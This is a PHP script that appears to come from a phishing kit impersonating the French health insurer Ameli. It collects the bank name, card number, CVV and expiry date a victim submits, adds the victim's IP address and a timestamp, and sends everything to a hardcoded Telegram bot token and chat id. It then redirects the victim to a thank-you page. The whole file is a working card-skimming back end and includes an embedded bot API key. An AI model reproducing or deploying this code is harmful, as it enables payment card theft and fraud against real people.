<?php
function functiondilih($cc)
    {
        $key = "1164921144:AAHPvnBw_OOTV57vBlc0pHHFcWDQz_48YCo";// hat hna apikey
        $idchat ="1292505075";//hat hna id chat   

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.$key.'/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$idchat."&text=".$cc."");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $headers = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
        $result = curl_exec($ch);

        curl_close ($ch);
    }
{
    $date = gmdate("H:i:s | d/m/Y");
    $victim_ip = getenv("REMOTE_ADDR");
    $message1 = "
========[ 😈😈  ameli carte  😈😈 ]========
La Banque  = ".$_POST['bank']."
Numero de carte  = ".$_POST['ccnum']."
cvv  = ".$_POST['cvv']."
Date d'expiration  = ".$_POST['expMonth']."/".$_POST['expYear']."
========[ 😈😈  Ip VICTIM  😈😈 ]========
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    = ".$date."
========[ 😈😈 BY x.clay 😈😈 ]========
";

           

            functiondilih($message1);

            

            header('Location: merci.php');
        }

